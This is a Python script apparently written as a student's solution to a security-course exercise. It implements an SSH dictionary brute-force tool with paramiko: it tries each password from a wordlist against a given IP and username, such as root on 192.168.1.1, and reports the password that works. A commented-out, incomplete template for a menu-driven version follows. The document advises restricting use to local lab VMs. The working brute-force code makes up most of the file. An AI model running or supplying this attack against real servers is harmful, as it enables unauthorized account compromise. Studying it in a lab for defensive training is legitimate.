# !/usr/bin/env python3
# Script: OPS 401 Class 02 Ops Challenge Solution
# Author: Ademola
# Date of latest revision: 9 May 2023
# Purpose: Ops Challenge: Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Firstly install paramiko using: **pip3 install paramiko**
import paramiko

def attempt_login(server_ip, username, password):
    """Attempt to login to the server."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(server_ip, username=username, password=password)
        return True
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()

def brute_force_ssh(server_ip, username, word_list_file):
    """Attempt to brute force the SSH server."""
    with open(word_list_file, 'r') as file:
        for line in file:
            password = line.strip()

            if attempt_login(server_ip, username, password):
                print(f'Success! The password is {password}')
                return password

    print('Failed to find password.')
    return None

# Example usage:
# brute_force_ssh('192.168.1.1', 'root', 'wordlist.txt')
# Add to your Python brute force tool the capability to:

# Authenticate to an SSH server by its IP address.
# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
# ----- Stay out of trouble! Restrict this kind of traffic to your local network VMs -----

# ----- TOOLS -----
# import sys, os

# # SSH Library -> https://www.paramiko.org/
# import paramiko

# # ----- VARIABLES -----
# host = input("Enter target host: ")
# username = input("Enter target username: ")
# filepath = input("Enter your wordlist filepath:\n")
# port = 22

# def connect_to_SSH():
#   # setup the SSHClient
#   sshConnection = paramiko.SSHClient()
#   # Auto-add host-key policy!
#   sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy)
#   # WHILE ITERATING through password list
#     # TRY connection EXCEPT: Failed to Authenticate and KeyboardInterrupt
#   try:
#     # Create the SSH connection with info: host, port, username, and password. 
#     sshConnection.connect(host, port, username, "password")
#     # print useful information if connected!

#   except paramiko.AuthenticationException:
#     print("Authentication Failed!\n")

#   except KeyboardInterrupt:
#     print("\n\n[*] User requested an interrupt.")
#     sys.exit() # this is Ctrl + C

#   # If password was incorrect, move to next password. hint: .readline()
#   file = open("filepath", encoding="ISO-8859-1")
#   line = file.readline()
#   file.close()
#   # Make sure to close your I/O resources, a.k.a file reader
#   # Close the SSH connection as well according to Paramiko's docs
#   sshConnection.close()

# def iterator():
#   print("Iterate through rockyou passwords!")
#   return

# def checkPassword():
#   print("Check password ran")
#   return

# if __name__ == "__main__": # when my computer runs this file...do this stuff


#     while True:
#         mode = input("""
# Brue Force Wordlist Attack Tool Menu
# 1 - Offensive, Dictionary Iterator
# 2 - Defensive, Password Recognized
# 3 - Exit
#     Please enter a number:
# """)
#         if (mode == "1"):
#             iterator()
#         elif (mode == "2"):
#             checkPassword()
#         elif (mode == '3'):
#             break
#         else:
#             print("Invalid selection...")



# Reference
## <https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/>
## <https://www.geeksforgeeks.org/how-to-execute-shell-commands-in-a-remote-machine-using-python-paramiko/>
## OpenAI